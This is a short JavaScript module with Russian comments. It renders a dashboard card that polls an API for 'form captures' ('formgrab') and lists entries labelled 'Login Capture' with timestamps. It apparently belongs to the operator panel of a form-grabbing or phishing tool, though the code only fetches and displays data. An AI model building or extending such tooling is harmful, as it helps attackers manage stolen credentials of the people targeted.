/**
 * Карточка форм: загрузка захватов форм.
 */
import { state } from "../state.js";
import { API, LIMITS, POLL_IDS, POLL_INTERVALS } from "../config.js";
import { escapeHtml, setListError } from "../utils.js";
import { loadSessionStats } from "./session.js";

export async function loadFormgrab(container) {
  const formgrabList = container.querySelector("#gc-formgrab-list");
  if (!formgrabList) return;
  formgrabList.classList.add("gc-forms-loading");
  try {
    const res = await fetch(API.formCaptures + "?limit=" + LIMITS.formCaptures);
    const data = await res.json();
    const captures = data.captures || [];
    loadSessionStats();
    formgrabList.classList.remove("gc-forms-loading");
    const formKey = captures.length + "|" + captures.map((c) => (c.ts || "") + (c.field || "")).join(";");
    if (formKey !== state.lastFormgrabKey) {
      state.lastFormgrabKey = formKey;
      if (captures.length === 0) {
        formgrabList.innerHTML = "<span class=\"gc-forms-empty\">Пока нет отправок форм.</span>";
        formgrabList.className = "gc-forms-list gc-forms-empty";
      } else {
        formgrabList.className = "gc-forms-list";
        formgrabList.innerHTML = captures.map((c) => "<div class=\"gc-forms-entry\"><div class=\"gc-forms-entry-row\">Form Type: <strong>" + escapeHtml(c.field || "Login Capture") + "</strong></div><div class=\"gc-forms-entry-row\">Timestamp: " + escapeHtml(c.ts || "—") + "</div><div class=\"gc-forms-entry-status\"><span class=\"gc-forms-check\" aria-hidden=\"true\">✓</span> Submitted</div></div>").join("");
      }
    }
  } catch (_) {
    formgrabList.classList.remove("gc-forms-loading");
    formgrabList.className = "gc-forms-list gc-forms-error";
    setListError(container, formgrabList, "Ошибка загрузки.", "gc-formgrab-retry", () => loadFormgrab(container), "gc-forms-empty");
  }
}

export function initForms(container) {
  container.querySelector("#gc-btn-formgrab")?.addEventListener("click", () => loadFormgrab(container));
  loadFormgrab(container);
  POLL_IDS.formCaptures = setInterval(() => loadFormgrab(container), POLL_INTERVALS.formCaptures);
}
